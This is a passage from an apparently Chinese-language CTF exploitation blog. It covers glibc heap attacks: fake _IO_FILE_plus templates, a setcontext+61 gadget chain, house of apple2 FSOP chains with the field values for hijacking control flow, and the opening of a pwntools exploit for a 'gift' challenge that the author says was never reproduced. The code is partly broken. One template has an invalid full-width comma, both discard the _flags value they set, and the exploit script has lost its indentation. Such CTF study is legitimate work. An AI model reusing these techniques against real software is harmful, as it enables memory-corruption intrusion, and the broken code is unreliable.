class="hljs-number">0xffffffffffffffff</span>,<br>  __seek = <span class="hljs-number">0x3e000000</span>,<br>  __close = <span class="hljs-number">0x7f3b57a97750</span> &lt;_IO_stdfile_1_lock&gt;,<br>  __stat = <span class="hljs-number">0xffffffffffffffff</span>,<br>  __showmanyc = <span class="hljs-number">0x0</span>,<br>  __imbue = <span class="hljs-number">0x7f3b57a949a0</span> &lt;_IO_wide_data_1&gt;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>_wide_vtable -&gt; __doallocate = chunkC  </code></p><h4 id="模板"><a href="#模板" class="headerlink" title="模板"></a>模板</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#fake_IO_FILE_plus</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">build_fake_file</span>(<span class="hljs-params">addr, rdx=<span class="hljs-number">0</span>, _wide_data， vtable</span>):<br>    flag = <span class="hljs-number">0xFBAD2887</span><br>    fake_file = p64(flag)  <span class="hljs-comment"># _flags</span><br>    fake_file += p64(addr)  <span class="hljs-comment"># _IO_read_ptr</span><br>    fake_file = <span class="hljs-string">b&quot;&quot;</span><br>    fake_file += p64(addr)  <span class="hljs-comment"># _IO_read_end</span><br>    fake_file += p64(addr)  <span class="hljs-comment"># _IO_read_base</span><br>    fake_file += p64(addr)  <span class="hljs-comment"># _IO_write_base</span><br>    fake_file += p64(addr + <span class="hljs-number">1</span>)  <span class="hljs-comment"># _IO_write_ptr</span><br>    fake_file += p64(rdx)  <span class="hljs-comment"># _IO_write_end</span><br>    fake_file += p64(addr)  <span class="hljs-comment"># _IO_buf_base</span><br>    fake_file += p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># _IO_buf_end</span><br>    fake_file += p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># _IO_save_base</span><br>    fake_file += p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># _IO_backup_base</span><br>    fake_file += p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># _IO_save_end</span><br>    fake_file += p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># _markers</span><br>    fake_file += p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># _chain   could be a anathor file struct</span><br>    fake_file += p32(<span class="hljs-number">1</span>)  <span class="hljs-comment"># _fileno</span><br>    fake_file += p32(<span class="hljs-number">0</span>)  <span class="hljs-comment"># _flags2</span><br>    fake_file += p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># _old_offset</span><br>    fake_file += p16(<span class="hljs-number">0</span>)  <span class="hljs-comment"># _cur_column</span><br>    fake_file += p8(<span class="hljs-number">0</span>)  <span class="hljs-comment"># _vtable_offset</span><br>    fake_file += p8(<span class="hljs-number">0x10</span>)  <span class="hljs-comment"># _shortbuf</span><br>    fake_file += p32(<span class="hljs-number">0</span>)<br>    fake_file += p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># _lock</span><br>    fake_file += p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># _offset</span><br>    fake_file += p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># _codecvt</span><br>    fake_file += p64(_wide_data)  <span class="hljs-comment"># _wide_data</span><br>    fake_file += p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># _freeres_list</span><br>    fake_file += p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># _freeres_buf</span><br>    fake_file += p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># __pad5</span><br>    fake_file += p32(<span class="hljs-number">0</span>)  <span class="hljs-comment"># _mode</span><br>    fake_file += p32(<span class="hljs-number">0</span>)  <span class="hljs-comment"># unused2</span><br>    fake_file += p64(<span class="hljs-number">0</span>) * <span class="hljs-number">2</span>  <span class="hljs-comment"># unused2</span><br>    fake_file += p64(vtable)  <span class="hljs-comment"># vtable</span><br>    <span class="hljs-keyword">return</span> fake_file<br><br><span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure><h3 id="setcontext-61-1"><a href="#setcontext-61-1" class="headerlink" title="setcontext+61"></a>setcontext+61</h3><p><strong>Glibc2.35下，找gadget通过rax控制rdx寄存器</strong></p><h4 id="magic-gadget"><a href="#magic-gadget" class="headerlink" title="magic_gadget"></a>magic_gadget</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0x00000000000fc83b : mov rdx, qword ptr [rax + 0xb0] ; call qword ptr [rax + 0x88]<br></code></pre></td></tr></table></figure><p>rax在call进chunk时，其值为chunkC地址，rax+0xb0设置为chunk6的地址，rax+0x88设置为setcontext+61。</p><h4 id="setcontext-61-2"><a href="#setcontext-61-2" class="headerlink" title="setcontext+61"></a>setcontext+61</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs assembly">;setcontext+61<br>.text:0000000000050BDD 48 8B A2 A0 00 00 00          mov     rsp, [rdx+0A0h]<br>.text:0000000000050BE4 48 8B 9A 80 00 00 00          mov     rbx, [rdx+80h]<br>.text:0000000000050BEB 48 8B 6A 78                   mov     rbp, [rdx+78h]<br>.text:0000000000050BEF 4C 8B 62 48                   mov     r12, [rdx+48h]<br>.text:0000000000050BF3 4C 8B 6A 50                   mov     r13, [rdx+50h]<br>.text:0000000000050BF7 4C 8B 72 58                   mov     r14, [rdx+58h]<br>.text:0000000000050BFB 4C 8B 7A 60                   mov     r15, [rdx+60h]<br>.text:0000000000050BFF 64 F7 04 25 48 00 00 00 02 00+test    dword ptr fs:48h, 2<br>.text:0000000000050BFF 00 00<br>.text:0000000000050C0B 0F 84 B5 00 00 00             jz      loc_50CC6<br>.text:0000000000050C0B<br>   ↓<br>.text:0000000000050CC6                               loc_50CC6:                              ; CODE XREF: setcontext+6B↑j<br>.text:0000000000050CC6 48 8B 8A A8 00 00 00          mov     rcx, [rdx+0A8h]<br>.text:0000000000050CCD 51                            push    rcx<br>.text:0000000000050CCE 48 8B 72 70                   mov     rsi, [rdx+70h]<br>.text:0000000000050CD2 48 8B 7A 68                   mov     rdi, [rdx+68h]<br>.text:0000000000050CD6 48 8B 8A 98 00 00 00          mov     rcx, [rdx+98h]<br>.text:0000000000050CDD 4C 8B 42 28                   mov     r8, [rdx+28h]<br>.text:0000000000050CE1 4C 8B 4A 30                   mov     r9, [rdx+30h]<br>.text:0000000000050CE5 48 8B 92 88 00 00 00          mov     rdx, [rdx+88h]<br>.text:0000000000050CE5                               ; &#125; // starts at 50BA0<br>.text:0000000000050CEC                               ; __unwind &#123;<br>.text:0000000000050CEC 31 C0                         xor     eax, eax<br>.text:0000000000050CEE C3                            retn<br></code></pre></td></tr></table></figure><p>当在堆块布置完chunk，做链子跳转时，rdi的值是目的堆的头指针</p><p>因为都是由rdx控制，所以在进gadget之前，先使用magic_gadget，将可控的rdi转换成可控的rdx</p><p>保证 rbp &gt;&#x3D; rsp, 除了 rcx，其他寄存器直接设置为 0</p><p><strong>将RCX寄存器的位置布置为ORW链子地址</strong></p><h4 id="图解-1"><a href="#图解-1" class="headerlink" title="图解"></a><strong>图解</strong></h4><p><img src="/../md/20.png" alt="在这里插入图片描述"></p><h3 id="house-of-apple2"><a href="#house-of-apple2" class="headerlink" title="house of apple2"></a>house of apple2</h3><p> house of apple2 &amp; setcontext + 61 &amp; orw</p><h4 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h4><p><a href="https://bbs.kanxue.com/thread-273832.htm#msg_header_h2_1">https://bbs.kanxue.com/thread-273832.htm#msg_header_h2_1</a></p><p><strong>调试链子</strong></p><p><a href="https://blog.csdn.net/m0_63437215/article/details/127914567">https://blog.csdn.net/m0_63437215/article/details/127914567</a></p><h4 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h4><p><strong>在<code>glibc</code>源码中搜索<code>_IO_WXXXXX</code>函数的调用：可被利用的<code>_IO_WDOALLOCATE</code>，&#96;_IO_WOVERFLOW</strong></p><p>通过构造<code>_IO_FILE</code>结构体，设置其中的变量</p><p>再触发下面链子中的函数，从而触发IO流，进而控制程序流</p><h5 id="三条链子"><a href="#三条链子" class="headerlink" title="三条链子"></a>三条链子</h5><p>一：<code>_IO_wfile_overflow函数</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">_IO_wfile_overflow<br>    _IO_wdoallocbuf<br>        _IO_WDOALLOCATE<br>            *(fp-&gt;_wide_data-&gt;_wide_vtable + <span class="hljs-number">0x68</span>)(fp)<br></code></pre></td></tr></table></figure><p><strong>_IO_FILE设置</strong></p><ol><li><code>_flags</code>设置为<code>~(2 | 0x8 | 0x800)</code>，如果不需要控制<code>rdi</code>，设置为<code>0</code>即可；如果需要获得<code>shell</code>，可设置为<code>sh;</code>，注意前面有两个空格</li><li><code>vtable</code>设置为<code>_IO_wfile_jumps/_IO_wfile_jumps_mmap/_IO_wfile_jumps_maybe_mmap</code>地址（加减偏移），使其能成功调用<code>_IO_wfile_overflow</code>即可</li><li><code>_wide_data</code>设置为可控堆地址<code>A</code>，即满足<code>*(fp + 0xa0) = A</code></li><li><code>_wide_data-&gt;_IO_write_base</code>设置为<code>0</code>，即满足<code>*(A + 0x18) = 0</code></li><li><code>_wide_data-&gt;_IO_buf_base</code>设置为<code>0</code>，即满足<code>*(A + 0x30) = 0</code></li><li><code>_wide_data-&gt;_wide_vtable</code>设置为可控堆地址<code>B</code>，即满足<code>*(A + 0xe0) = B</code></li><li><code>_wide_data-&gt;_wide_vtable-&gt;doallocate</code>设置为地址<code>C</code>用于劫持<code>RIP</code>，即满足<code>*(B + 0x68) = C</code></li></ol><p>二：<code>_IO_wfile_underflow_mmap函数</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">_IO_wfile_underflow_mmap<br>    _IO_wdoallocbuf<br>        _IO_WDOALLOCATE<br>            *(fp-&gt;_wide_data-&gt;_wide_vtable + <span class="hljs-number">0x68</span>)(fp)<br></code></pre></td></tr></table></figure><p><strong>_IO_FILE设置</strong></p><ul><li><code>_flags</code>设置为<code>~4</code>，如果不需要控制<code>rdi</code>，设置为<code>0</code>即可；如果需要获得<code>shell</code>，可设置为<code>sh;</code>，注意前面有个空格</li><li><code>vtable</code>设置为<code>_IO_wfile_jumps_mmap</code>地址（加减偏移），使其能成功调用<code>_IO_wfile_underflow_mmap</code>即可</li><li><code>_IO_read_ptr &lt; _IO_read_end</code>，即满足<code>*(fp + 8) &lt; *(fp + 0x10)</code></li><li><code>_wide_data</code>设置为可控堆地址<code>A</code>，即满足<code>*(fp + 0xa0) = A</code></li><li><code>_wide_data-&gt;_IO_read_ptr &gt;= _wide_data-&gt;_IO_read_end</code>，即满足<code>*A &gt;= *(A + 8)</code></li><li><code>_wide_data-&gt;_IO_buf_base</code>设置为<code>0</code>，即满足<code>*(A + 0x30) = 0</code></li><li><code>_wide_data-&gt;_IO_save_base</code>设置为<code>0</code>或者合法的可被<code>free</code>的地址，即满足<code>*(A + 0x40) = 0</code></li><li><code>_wide_data-&gt;_wide_vtable</code>设置为可控堆地址<code>B</code>，即满足<code>*(A + 0xe0) = B</code></li><li><code>_wide_data-&gt;_wide_vtable-&gt;doallocate</code>设置为地址<code>C</code>用于劫持<code>RIP</code>，即满足<code>*(B + 0x68) = C</code></li></ul><p>三：<code>_IO_wdefault_xsgetn函数</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">_IO_wdefault_xsgetn<br>    __wunderflow<br>        _IO_switch_to_wget_mode<br>            _IO_WOVERFLOW<br>                *(fp-&gt;_wide_data-&gt;_wide_vtable + <span class="hljs-number">0x18</span>)(fp)<br></code></pre></td></tr></table></figure><p><strong>条件：调用到_IO_wdefault_xsgetn时rdx寄存器，也就是第三个参数不为0</strong></p><p><strong>_IO_FILE设置</strong></p><ul><li><code>_flags</code>设置为<code>0x800</code></li><li><code>vtable</code>设置为<code>_IO_wstrn_jumps/_IO_wmem_jumps/_IO_wstr_jumps</code>地址（加减偏移），使其能成功调用<code>_IO_wdefault_xsgetn</code>即可</li><li><code>_mode</code>设置为大于<code>0</code>，即满足<code>*(fp + 0xc0) &gt; 0</code></li><li><code>_wide_data</code>设置为可控堆地址<code>A</code>，即满足<code>*(fp + 0xa0) = A</code></li><li><code>_wide_data-&gt;_IO_read_end == _wide_data-&gt;_IO_read_ptr</code>设置为<code>0</code>，即满足<code>*(A + 8) = *A</code></li><li><code>_wide_data-&gt;_IO_write_ptr &gt; _wide_data-&gt;_IO_write_base</code>，即满足<code>*(A + 0x20) &gt; *(A + 0x18)</code></li><li><code>_wide_data-&gt;_wide_vtable</code>设置为可控堆地址<code>B</code>，即满足<code>*(A + 0xe0) = B</code></li><li><code>_wide_data-&gt;_wide_vtable-&gt;overflow</code>设置为地址<code>C</code>用于劫持<code>RIP</code>，即满足<code>*(B + 0x18) = C</code></li></ul><h4 id="模板-1"><a href="#模板-1" class="headerlink" title="模板"></a><strong>模板</strong></h4><ol><li><code>large bin attack</code>改<code>_IO_list_all</code>——<strong>FSOP：劫持<code>_IO_list_all </code>的值</strong></li><li><strong>伪造链表和其中的<code>_IO_FILE_plus</code> 项</strong></li><li>通过FSOP执行<code>setcontext</code>, 后执行ORW链</li></ol><p><strong>fake_IO</strong><br>原文链接：<a href="https://blog.csdn.net/woodwhale/article/details/128926309">https://blog.csdn.net/woodwhale/article/details/128926309</a></p><p><strong>使用FSOP，伪造的_IO_FILE_plus结构体</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">build_fake_file</span>(<span class="hljs-params">addr, vtable, _wide_data, rdx=<span class="hljs-number">0</span></span>):<br>    <span class="hljs-comment"># flag = 0xFBAD2887</span><br>    <span class="hljs-comment"># fake_file = p64(flag)  # _flags</span><br>    <span class="hljs-comment"># fake_file += p64(addr)  # _IO_read_ptr</span><br>    <span class="hljs-comment"># 不用上面的flag和_IO_read_ptr是因为chunk里不可控上面两个字段</span><br>    fake_file = <span class="hljs-string">b&quot;&quot;</span><br>    fake_file += p64(addr)  <span class="hljs-comment"># _IO_read_end</span><br>    fake_file += p64(addr)  <span class="hljs-comment"># _IO_read_base</span><br>    fake_file += p64(addr)  <span class="hljs-comment"># _IO_write_base</span><br>    fake_file += p64(addr + <span class="hljs-number">1</span>)  <span class="hljs-comment"># _IO_write_ptr</span><br>    fake_file += p64(rdx)  <span class="hljs-comment"># _IO_write_end</span><br>    fake_file += p64(addr)  <span class="hljs-comment"># _IO_buf_base</span><br>    fake_file += p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># _IO_buf_end</span><br>    fake_file += p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># _IO_save_base</span><br>    fake_file += p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># _IO_backup_base</span><br>    fake_file += p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># _IO_save_end</span><br>    fake_file += p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># _markers</span><br>    fake_file += p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># _chain   could be a anathor file struct</span><br>    fake_file += p32(<span class="hljs-number">1</span>)  <span class="hljs-comment"># _fileno</span><br>    fake_file += p32(<span class="hljs-number">0</span>)  <span class="hljs-comment"># _flags2</span><br>    fake_file += p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># _old_offset</span><br>    fake_file += p16(<span class="hljs-number">0</span>)  <span class="hljs-comment"># _cur_column</span><br>    fake_file += p8(<span class="hljs-number">0</span>)  <span class="hljs-comment"># _vtable_offset</span><br>    fake_file += p8(<span class="hljs-number">0x10</span>)  <span class="hljs-comment"># _shortbuf</span><br>    fake_file += p32(<span class="hljs-number">0</span>)<br>    <br>    fake_file += p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># _lock</span><br>    fake_file += p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># _offset</span><br>    fake_file += p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># _codecvt</span><br>    fake_file += p64(_wide_data)  <span class="hljs-comment"># _wide_data</span><br>    fake_file += p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># _freeres_list</span><br>    fake_file += p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># _freeres_buf</span><br>    fake_file += p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># __pad5</span><br>    fake_file += p32(<span class="hljs-number">0</span>)  <span class="hljs-comment"># _mode</span><br>    fake_file += p32(<span class="hljs-number">0</span>)  <span class="hljs-comment"># unused2</span><br>    fake_file += p64(<span class="hljs-number">0</span>) * <span class="hljs-number">2</span>  <span class="hljs-comment"># unused2</span><br>    fake_file += p64(vtable)  <span class="hljs-comment"># vtable</span><br>    <span class="hljs-keyword">return</span> fake_file<br></code></pre></td></tr></table></figure><h2 id="12-4nswer’s-gift"><a href="#12-4nswer’s-gift" class="headerlink" title="12.4nswer’s gift"></a>12.4nswer’s gift</h2><p>原文链接：<a href="https://blog.csdn.net/woodwhale/article/details/128926309">https://blog.csdn.net/woodwhale/article/details/128926309</a></p><p>没做复现，libc版本编译了三次都不对</p><p><strong>Ubuntu GLIBC 2.36-0ubuntu2</strong></p><h3 id="分析-9"><a href="#分析-9" class="headerlink" title="分析"></a>分析</h3><p>vuln(V3)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> __noreturn <span class="hljs-title function_">vuln</span><span class="hljs-params">()</span><br>&#123;<br>  _DWORD size[<span class="hljs-number">3</span>]; <span class="hljs-comment">// [rsp+4h] [rbp-1Ch] BYREF</span><br>  <span class="hljs-type">void</span> *buf; <span class="hljs-comment">// [rsp+10h] [rbp-10h]</span><br>  <span class="hljs-type">unsigned</span> __int64 v2; <span class="hljs-comment">// [rsp+18h] [rbp-8h]</span><br><br>  v2 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>    <br>  *(_QWORD *)&amp;size[<span class="hljs-number">1</span>] = &amp;<span class="hljs-built_in">malloc</span> + <span class="hljs-number">175652</span>;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;4nswer is preparing a gitf for his girfriend, the box of it looks like this: %p\n&quot;</span>, &amp;<span class="hljs-built_in">malloc</span> + <span class="hljs-number">175652</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;But he don&#x27;t know what to put into the gift.&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;So he need you help.&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;How many things do you think is appropriate to put into the gift?&quot;</span>);<br>    <br>  __isoc99_scanf(<span class="hljs-string">&quot;%u&quot;</span>, size);<br>    <br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;What do you think is appropriate to put into the gitf?&quot;</span>);<br>    <br>  buf = <span class="hljs-built_in">malloc</span>(size[<span class="hljs-number">0</span>]);<br>  read(<span class="hljs-number">0</span>, buf, (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)(size[<span class="hljs-number">0</span>] - <span class="hljs-number">1</span>));<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;4nswer purchased things you suggest, and put it into the box.&quot;</span>);<br>    <br>  **(_QWORD **)&amp;size[<span class="hljs-number">1</span>] = buf;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;buy~&quot;</span>);<br>  <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>house of apple1</strong></p><p><strong>这一系列链子的核心思想应该是利用一次的<code>large bin attack</code>攻击，劫持<code>_IO_list_all</code>，从而劫持IO流</strong></p><h3 id="exp-10"><a href="#exp-10" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span><br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>)<br><br>libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br>banary = <span class="hljs-string">&quot;./vuln&quot;</span><br>elf = ELF(banary)<br>ip = <span class="hljs-string">&#x27;1&#x27;</span><br>port = <span class="hljs-number">1</span><br><br>local = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span>(local==<span class="hljs-number">1</span>):<br>p = process(banary)<br><span class="hljs-keyword">else</span>:<br>p = remote(ip, port)<br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>gdb.attach(p)<br>pause()<br><br>s = <span class="hljs-keyword">lambda</span> data : p.send(data)<br>sl = <span class="hljs-keyword">lambda</span> data : p.sendline(data)<br>sa = <span class="hljs-keyword">lambda</span> text, data : p.sendafter(text, data)<br>sla = <span class="hljs-keyword">lambda</span> text, data : p.sendlineafter(text, data)<br>r = <span class="hljs-keyword">lambda</span> : p.recv()<br>ru = <span class="hljs-keyword">lambda</span> text : p.recvuntil(text)<br>uu32 = <span class="hljs-keyword">lambda</span> : u32(p.recvuntil(<span class="hljs-string">b&quot;\xff&quot;</span>)[-<span class="hljs-number">4</span>:].ljust(<span class="hljs-number">4</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>uu64 = <span class="hljs-keyword">lambda</span> : u64(p.recvuntil(<span class="hljs-string">b&quot;\x7f&quot;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&quot;\x00&quot;</span>))<br>lg = <span class="hljs-keyword">lambda</span> s : log.info(<span class="hljs-string">&#x27;\x1b[01;38;5;214m %s --&gt; 0x%x \033[0m&#x27;</span> % (s, <span class="hljs-built_in">eval</span>(s)))<br>pi = <span class="hljs-keyword">lambda</span> : p.interactive()<br><br><span class="hljs-comment">#------------------------ MENU  ----------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">build_fake_file</span>(<span class="hljs-params">flag , addr, vtable, _wide_data, rdx=<span class="hljs-number">0</span></span>):<br>    flag = <span class="hljs-number">0xFBAD2887</span><br>    fake_file = p64(flag)  <span class="hljs-comment"># _flags</span><br>    fake_file += p64(addr)  <span class="hljs-comment"># _IO_read_ptr</span><br>    fake_file = <span class="hljs-string">b&quot;&quot;</span><br>    fake_file += p64(addr)  <span class="hljs-comment"># _IO_read_end</span><br>    fake_file += p64(addr)  <span class="hljs-comment"># _IO_read_base</span><br>    fake_file += p64(addr)  <span class="hljs-comment"># _IO_write_base</span><br>    fake_file += p64(addr + <span class="hljs-number">1</span>)  <span class="hljs-comment"># _IO_write_ptr</span><br>    fake_file += p64(rdx)  <span class="hljs-comment"># _IO_write_end</span><br>    fake_file += p64(addr)  <span class="hljs-comment"># _IO_buf_base</span><br>    fake_file += p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># _IO_buf_end</span><br>    fake_file += p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># _IO_save_base</span><br>    fake_file += p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># _IO_backup_base</span><br>    fake_file += p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># _IO_save_end</span><br>    fake_file += p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># _markers</span><br>    fake_file += p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># _chain   could be a anathor file struct</span><br>    fake_file += p32(<span class="hljs-number">1</span>)  <span class="hljs-comment"># _fileno</span><br>    fake_file += p32(<span class="hljs-number">0</span>)  <span class="hljs-comment"># _flags2</span><br>    fake_file += p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># _old_offset</span><br>    fake_file += p16(<span 